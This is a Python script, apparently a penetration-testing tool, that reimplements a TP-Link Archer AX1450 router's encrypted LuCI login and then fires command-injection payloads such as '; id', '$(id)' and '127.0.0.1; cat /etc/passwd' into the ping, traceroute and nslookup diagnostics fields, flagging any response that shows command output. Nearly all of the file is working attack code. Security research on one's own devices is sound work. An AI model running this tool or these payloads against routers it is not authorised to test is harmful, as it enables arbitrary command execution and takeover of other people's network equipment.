# LUCI COMMAND INJECTION TESTER
# TARGET: TP-Link Archer AX1450 — /admin/diag
# GOAL: Authenticate to LuCI, send encrypted command injection payloads to diagnostics endpoint


# UI IMPORTS
from rich.console import Console
from rich.panel import Panel
from rich.table import Table


# CRYPTO IMPORTS
import hashlib
import base64
import json
import random
import struct


# NETWORK IMPORTS
import urllib.request
import urllib.parse
import urllib.error


# ETC IMPORTS
import argparse


# CONSTANTS
console = Console()
TARGET = "192.168.0.1"




class RSA_Encrypt():
    """Mirrors the custom RSA implementation in encrypt.js (not standard PKCS1 — custom padding)"""


    @classmethod
    def _int_to_bytes(cls, n, length):
        return n.to_bytes(length, 'big')


    @classmethod
    def _bytes_to_int(cls, b):
        return int.from_bytes(b, 'big')


    @classmethod
    def _pkcs1_pad(cls, message_bytes, key_length_bytes):
        """PKCS#1 v1.5 encrypt padding"""

        msg_len  = len(message_bytes)
        pad_len  = key_length_bytes - msg_len - 3

        # RANDOM NON-ZERO PADDING BYTES
        padding = bytes([random.randint(1, 255) for _ in range(pad_len)])

        return b'\x00\x02' + padding + b'\x00' + message_bytes


    @classmethod
    def encrypt_block(cls, plaintext_str, n_hex, e_hex):
        """Encrypt one 53-char block — mirrors rsa.encrypt() in encrypt.js"""

        n          = int(n_hex, 16)
        e          = int(e_hex, 16)
        key_bytes  = (n.bit_length() + 7) // 8

        msg_bytes  = plaintext_str.encode('utf-8')
        padded     = cls._pkcs1_pad(msg_bytes, key_bytes)
        padded_int = cls._bytes_to_int(padded)

        # RSA OPERATION
        cipher_int = pow(padded_int, e, n)
        cipher_hex = format(cipher_int, f'0{key_bytes * 2}x')

        return cipher_hex


    @classmethod
    def encrypt_string(cls, plaintext, n_hex, e_hex):
        """Encrypt full string in 53-char chunks, concat hex output — mirrors getSignature()"""

        result = ""
        offset = 0

        while offset < len(plaintext):
            chunk   = plaintext[offset:offset + 53]
            result += cls.encrypt_block(chunk, n_hex, e_hex)
            offset += 53

        return result




class AES_Encrypt():
    """AES-CBC-PKCS7 — mirrors CryptoJS.AES.encrypt() used in tpEncrypt.js"""


    @classmethod
    def _pad(cls, data):
        """PKCS7 padding"""

        pad_size = 16 - (len(data) % 16)
        return data + bytes([pad_size] * pad_size)


    @classmethod
    def _xor(cls, a, b):
        return bytes(x ^ y for x, y in zip(a, b))


    @classmethod
    def _aes_block(cls, block, key_schedule):
        """Single AES block encrypt — uses Python's built-in via Crypto if available, else fallback"""

        try:
            from Crypto.Cipher import AES as _AES
            cipher = _AES.new(key_schedule, _AES.MODE_ECB)
            return cipher.encrypt(block)
        except ImportError:
            # FALLBACK: USE SUBPROCESS OPENSSL
            import subprocess, tempfile, os
            tmp = tempfile.mktemp()
            with open(tmp, 'wb') as f: f.write(block)
            result = subprocess.run(
                ['openssl', 'enc', '-aes-128-ecb', '-nopad', '-nosalt', '-K', key_schedule.hex()],
                input=block, capture_output=True
            )
            return result.stdout


    @classmethod
    def encrypt(cls, plaintext_str, key_str, iv_str):
        """AES-CBC encrypt — returns base64 string matching CryptoJS output"""

        try:
            from Crypto.Cipher import AES as _AES

            key     = key_str.encode('utf-8')
            iv      = iv_str.encode('utf-8')
            data    = cls._pad(plaintext_str.encode('utf-8'))
            cipher  = _AES.new(key, _AES.MODE_CBC, iv)
            ct      = cipher.encrypt(data)

            return base64.b64encode(ct).decode('utf-8')

        except ImportError:
            console.print("[bold red][!] pycryptodome not installed — run: pip install pycryptodome")
            raise




class LuCI_Client():
    """Handles authentication and encrypted request sending to TP-Link LuCI"""


    def __init__(self, host, password):

        self.host     = host
        self.password = password
        self.stok     = None
        self.seq      = None
        self.rsa_n    = None
        self.rsa_e    = None
        self.aes_key  = None
        self.aes_iv   = None
        self.hash     = None


    def _post(self, path, body_str, headers=None, debug=False):
        """Raw POST — returns response text"""

        url  = f"http://{self.host}/cgi-bin/luci/{path}"
        data = body_str.encode('utf-8')
        hdrs = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Connection':   'close',
            'Referer':      f'http://{self.host}/',
            'Origin':       f'http://{self.host}',
        }

        if headers: hdrs.update(headers)

        if debug:
            console.print(f"[dim]POST {url}")
            console.print(f"[dim]BODY: {body_str[:120]}...")

        req  = urllib.request.Request(url, data=data, headers=hdrs)
        resp = urllib.request.urlopen(req, timeout=10)
        raw  = resp.read().decode('utf-8')

        if debug: console.print(f"[dim]RESP: {raw[:200]}")

        return raw


    def _gen_aes_key(self):
        """Generate 16-digit random AES key and IV — mirrors AES.genKey() in tpEncrypt.js"""

        self.aes_key = ''.join([str(random.randint(0, 9)) for _ in range(16)])
        self.aes_iv  = ''.join([str(random.randint(0, 9)) for _ in range(16)])


    def _compute_hash(self, username="admin"):
        """MD5(username + password) — mirrors setHash() in tpEncrypt.js"""

        self.hash = hashlib.md5((username + self.password).encode()).hexdigest()


    def _build_sign(self, data_b64):
        """Build sign field — mirrors getSignature() with AES key included"""

        data_len    = len(data_b64)
        sign_string = f"k={self.aes_key}&i={self.aes_iv}&h={self.hash}&s={self.seq + data_len}"

        return RSA_Encrypt.encrypt_string(sign_string, self.rsa_n, self.rsa_e)


    def _encrypt_payload(self, payload_dict):
        """Encrypt a dict payload — returns (sign, data) tuple"""

        payload_json = json.dumps(payload_dict, separators=(',', ':'))
        data_b64     = AES_Encrypt.encrypt(payload_json, self.aes_key, self.aes_iv)
        sign         = self._build_sign(data_b64)

        return sign, data_b64


    def get_rsa_keys(self):
        """Step 1 — GET RSA public key from router (no auth required)"""

        body   = "operation=read"
        resp   = self._post(";stok=/login?form=keys", body)
        parsed = json.loads(resp)

        self.rsa_n = parsed['data']['password'][0]
        self.rsa_e = parsed['data']['password'][1]

        console.print(f"[bold green][+] RSA key fetched — n={self.rsa_n[:32]}... e={self.rsa_e}")


    def get_seq(self):
        """Step 2 — GET sequence number from /login?form=auth"""

        body   = "operation=read"
        resp   = self._post(";stok=/login?form=auth", body, debug=True)
        parsed = json.loads(resp)

        # SEQ MAY BE NESTED DIFFERENTLY DEPENDING ON FIRMWARE — LOG RAW
        console.print(f"[dim]auth response: {parsed}")

        data     = parsed.get('data', parsed)
        self.seq = int(data.get('seq', data.get('Seq', 0)))
        console.print(f"[bold green][+] Sequence number: {self.seq}")


    def authenticate(self, username="admin"):
        """Step 3 — Authenticate and get stok"""

        self._gen_aes_key()

        # TRY MD5(PASSWORD) FIRST — MOST COMMON IN TP-LINK FIRMWARE
        pwd_md5      = hashlib.md5(self.password.encode()).hexdigest()

        # HASH IN SIGN = MD5(USERNAME + PASSWORD) — TRY PLAINTEXT PASS FIRST
        self.hash = hashlib.md5((username + self.password).encode()).hexdigest()

        # OPERATION=LOGIN IS REQUIRED — writeFilter IN localLogin/models.js ADDS IT
        payload = {"operation": "login", "password": pwd_md5}
        sign, data = self._encrypt_payload(payload)

        body   = f"sign={urllib.parse.quote(sign)}&data={urllib.parse.quote(data)}"
        resp   = self._post(";stok=/login?form=login", body, debug=True)
        parsed = json.loads(resp)

        console.print(f"[dim]login response: {resp[:300]}")

        # DECRYPT RESPONSE
        resp_data = parsed.get('data', '')
        if resp_data:
            from Crypto.Cipher import AES as _AES
            ct      = base64.b64decode(resp_data)
            key     = self.aes_key.encode()
            iv      = self.aes_iv.encode()
            cipher  = _AES.new(key, _AES.MODE_CBC, iv)
            pt      = cipher.decrypt(ct)
            pt      = pt[:-pt[-1]]  # REMOVE PKCS7 PADDING
            result  = json.loads(pt.decode())

            self.stok = result.get('stok', '')
            console.print(f"[bold green][+] Authenticated — stok={self.stok[:16]}...")
            return True

        console.print("[bold red][-] Auth failed — check password")
        return False


    def send_diag(self, form, payload_dict):
        """Send encrypted request to /admin/diag — returns decrypted response"""

        if not self.stok:
            console.print("[bold red][!] Not authenticated")
            return None

        sign, data = self._encrypt_payload(payload_dict)
        body       = f"sign={urllib.parse.quote(sign)}&data={urllib.parse.quote(data)}"

        path = f";stok={self.stok}/admin/diag?form={form}"

        try:
            resp   = self._post(path, body)
            parsed = json.loads(resp)

            resp_data = parsed.get('data', '')
            if resp_data:
                from Crypto.Cipher import AES as _AES
                ct     = base64.b64decode(resp_data)
                key    = self.aes_key.encode()
                iv     = self.aes_iv.encode()
                cipher = _AES.new(key, _AES.MODE_CBC, iv)
                pt     = cipher.decrypt(ct)
                pt     = pt[:-pt[-1]]
                return pt.decode()

            return resp

        except Exception as e:
            console.print(f"[bold red][!] Request error: {e}")
            return None




class Inject_Tester():
    """Runs command injection payloads against /admin/diag ping/traceroute/nslookup"""


    # INJECTION PAYLOADS — TEST EACH ONE
    payloads = [
        "; id",
        "| id",
        "`id`",
        "$(id)",
        "127.0.0.1; id",
        "127.0.0.1 && id",
        "127.0.0.1 | id",
        "127.0.0.1; cat /etc/passwd",
        "127.0.0.1; cat /proc/version",
        "127.0.0.1; ls /",
        "127.0.0.1; uname -a",
    ]

    # FORMS TO TEST — THESE ARE DIAGNOSIS ENDPOINTS WITH USER INPUT
    forms = [
        ("diagnosis", "ping",       "addr"),
        ("diagnosis", "tracert",    "addr"),
        ("diagnosis", "nslookup",   "addr"),
    ]


    @classmethod
    def run(cls, client):

        table = Table(title="Injection Test Results", border_style="bold yellow", show_lines=True)
        table.add_column("Form",    style="bold cyan")
        table.add_column("Type",    style="bold blue")
        table.add_column("Payload", style="bold yellow")
        table.add_column("Result",  style="bold green")

        for form, diag_type, field in cls.forms:
            for payload in cls.payloads:

                console.print(f"[bold cyan]Testing {diag_type} → [bold yellow]{payload}")

                req = {
                    "method":       "do",
                    "diag":         {
                        "type":     diag_type,
                        field:      payload
                    }
                }

                result = client.send_diag(form, req)

                if result:
                    result_short = result[:100].replace('\n', ' ')
                    contains_uid = "uid=" in result or "root" in result or "passwd" in result
                    flag         = "[bold red]!! INJECTION CONFIRMED !!" if contains_uid else result_short
                    table.add_row(form, diag_type, payload, flag)

                    if contains_uid:
                        console.print(Panel(result, title="[bold red]!! COMMAND INJECTION FOUND !!", border_style="red"))
                else:
                    table.add_row(form, diag_type, payload, "[dim]No response")

        console.print(table)


    @classmethod
    def main(cls):

        parser = argparse.ArgumentParser(description="NSM LuCI Injection Tester")
        parser.add_argument("-t", "--target",   default="192.168.0.1",  help="Target IP")
        parser.add_argument("-p", "--password", required=True,           help="Router admin password")
        parser.add_argument("-u", "--username", default="admin",         help="Username (default: admin)")
        args = parser.parse_args()

        panel = Panel(
            f"[bold red]Target:[/bold red] {args.target}   [bold red]User:[/bold red] {args.username}",
            title="[bold red]NSM LuCI Injection Tester",
            border_style="bold yellow",
            expand=False
        )

        console.print(panel)

        client = LuCI_Client(host=args.target, password=args.password)

        console.print("\n[bold cyan]Step 1 — Fetching RSA keys...")
        client.get_rsa_keys()

        console.print("\n[bold cyan]Step 2 — Getting sequence number...")
        client.get_seq()

        console.print("\n[bold cyan]Step 3 — Authenticating...")
        ok = client.authenticate(username=args.username)

        if not ok:
            console.print("[bold red]Authentication failed. Exiting.")
            return

        console.print("\n[bold cyan]Step 4 — Running injection tests...")
        cls.run(client)




if __name__ == "__main__": Inject_Tester.main()
